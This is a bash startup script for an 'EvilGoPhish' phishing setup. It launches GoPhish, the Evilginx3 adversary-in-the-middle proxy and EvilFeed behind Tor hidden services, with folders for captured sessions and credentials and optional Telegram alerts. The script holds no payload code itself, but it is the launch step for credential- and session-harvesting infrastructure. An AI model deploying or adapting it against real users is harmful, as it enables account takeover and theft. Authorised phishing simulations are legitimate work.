#!/usr/bin/env bash

# EvilGoPhish Startup Script for Hidden Services
# This script starts all components in the correct order

set -e

SCRIPT_DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )"
cd "$SCRIPT_DIR"

# Configuration
REPORTS_DIR="${REPORTS_DIR:-$SCRIPT_DIR/reports}"
TELEGRAM_CONFIG="${TELEGRAM_CONFIG:-$SCRIPT_DIR/telegram_config.json}"
GOPHISH_DB="$SCRIPT_DIR/gophish/gophish.db"
EVILGINX_DIR="$SCRIPT_DIR/evilginx3"
GOPHISH_DIR="$SCRIPT_DIR/gophish"
EVILFEED_DIR="$SCRIPT_DIR/evilfeed"

# Logging
LOG_DIR="$SCRIPT_DIR/logs"
mkdir -p "$LOG_DIR"
TIMESTAMP=$(date +%Y%m%d_%H%M%S)

log() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" | tee -a "$LOG_DIR/startup_${TIMESTAMP}.log"
}

log "Starting EvilGoPhish for Hidden Services..."

# Check if Tor is running
if ! pgrep -x "tor" > /dev/null; then
    log "WARNING: Tor is not running. Hidden services require Tor."
    log "Starting Tor service..."
    systemctl start tor || log "Failed to start Tor. Please start it manually."
    sleep 5
fi

# Create necessary directories
mkdir -p "$REPORTS_DIR"/{sessions,credentials,raw}
log "Reports directory: $REPORTS_DIR"

# Check for Telegram configuration
if [ -f "$TELEGRAM_CONFIG" ]; then
    log "Telegram configuration found: $TELEGRAM_CONFIG"
else
    log "WARNING: Telegram configuration not found. Notifications disabled."
fi

# Start GoPhish in background
log "Starting GoPhish..."
cd "$GOPHISH_DIR"
nohup ./gophish > "$LOG_DIR/gophish_${TIMESTAMP}.log" 2>&1 &
GOPHISH_PID=$!
echo $GOPHISH_PID > "$SCRIPT_DIR/gophish.pid"
log "GoPhish started with PID: $GOPHISH_PID"
cd "$SCRIPT_DIR"

# Wait for GoPhish to initialize
sleep 5

# Start EvilFeed if enabled
FEED_ENABLED=$(grep -o '"feed_enabled": *true' "$GOPHISH_DIR/config.json" || echo "false")
if [[ "$FEED_ENABLED" == *"true"* ]]; then
    log "Starting EvilFeed..."
    cd "$EVILFEED_DIR"
    nohup ./evilfeed > "$LOG_DIR/evilfeed_${TIMESTAMP}.log" 2>&1 &
    EVILFEED_PID=$!
    echo $EVILFEED_PID > "$SCRIPT_DIR/evilfeed.pid"
    log "EvilFeed started with PID: $EVILFEED_PID"
    cd "$SCRIPT_DIR"
    sleep 2
fi

# Start Evilginx3
log "Starting Evilginx3..."
cd "$EVILGINX_DIR"

# Build evilginx3 command with all necessary flags
EVILGINX_CMD="./evilginx3 -g $GOPHISH_DB"

# Add feed flag if enabled
if [[ "$FEED_ENABLED" == *"true"* ]]; then
    EVILGINX_CMD="$EVILGINX_CMD -feed"
fi

# Add Telegram config if exists
if [ -f "$TELEGRAM_CONFIG" ]; then
    EVILGINX_CMD="$EVILGINX_CMD -telegram $TELEGRAM_CONFIG"
fi

# Add reports directory
EVILGINX_CMD="$EVILGINX_CMD -reports $REPORTS_DIR"

log "Running: $EVILGINX_CMD"
nohup $EVILGINX_CMD > "$LOG_DIR/evilginx3_${TIMESTAMP}.log" 2>&1 &
EVILGINX_PID=$!
echo $EVILGINX_PID > "$SCRIPT_DIR/evilginx3.pid"
log "Evilginx3 started with PID: $EVILGINX_PID"

cd "$SCRIPT_DIR"

# Wait a bit to ensure everything started
sleep 5

# Check if processes are still running
check_process() {
    local PID=$1
    local NAME=$2
    if ps -p $PID > /dev/null 2>&1; then
        log "$NAME is running (PID: $PID)"
        return 0
    else
        log "ERROR: $NAME failed to start or crashed immediately"
        return 1
    fi
}

ALL_OK=true
check_process $GOPHISH_PID "GoPhish" || ALL_OK=false
if [ ! -z "$EVILFEED_PID" ]; then
    check_process $EVILFEED_PID "EvilFeed" || ALL_OK=false
fi
check_process $EVILGINX_PID "Evilginx3" || ALL_OK=false

if [ "$ALL_OK" = true ]; then
    log "All components started successfully!"
    log "Access GoPhish at: https://localhost:3333"
    if [[ "$FEED_ENABLED" == *"true"* ]]; then
        log "Access EvilFeed at: http://localhost:1337"
    fi
    log "Logs are in: $LOG_DIR"
else
    log "ERROR: Some components failed to start. Check logs in $LOG_DIR"
    exit 1
fi
